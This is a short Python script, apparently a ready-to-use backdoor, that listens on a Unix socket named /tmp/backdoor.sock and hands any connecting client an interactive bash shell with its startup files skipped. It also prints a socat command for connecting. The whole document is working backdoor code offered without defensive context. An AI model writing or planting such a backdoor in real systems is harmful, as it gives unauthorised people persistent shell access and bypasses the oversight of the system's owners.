import socket
import os
import subprocess

SOCKET_PATH = "/tmp/backdoor.sock"

def main():
    try:
        os.unlink(SOCKET_PATH)
    except FileNotFoundError:
        pass

    srv = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
    srv.bind(SOCKET_PATH)
    srv.listen(1)
    print(f"Listening on {SOCKET_PATH}")
    print(f"Connect with: socat - UNIX:{SOCKET_PATH}")

    conn, _ = srv.accept()
    print("Client connected")

    fd = conn.fileno()
    proc = subprocess.Popen(
        ["/bin/bash", "--norc", "--noprofile"],
        stdin=fd, stdout=fd, stderr=fd
    )
    conn.close()
    srv.close()
    proc.wait()

    try:
        os.unlink(SOCKET_PATH)
    except FileNotFoundError:
        pass

if __name__ == "__main__":
    main()
